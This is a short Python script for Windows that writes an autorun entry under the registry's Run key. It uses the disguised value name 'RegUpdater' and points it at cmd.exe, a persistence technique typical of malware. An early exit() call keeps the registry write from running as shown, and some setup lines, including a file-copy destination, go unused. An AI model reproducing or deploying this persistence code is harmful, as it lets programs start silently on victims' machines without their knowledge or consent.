import os # needed for getting working directory
import shutil # needed for file copying
import subprocess # needed for getting user profile
import winreg as wreg # needed for editing registry DB
path = os.getcwd().strip('/n')
print(path)
destination = os.getenv('userprofile').strip('\n\r') + '\\Documents\\'
print(destination)

target = "C:\WINDOWS\system32\cmd.exe"
print(target)
exit()
key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,target)
key.Close()
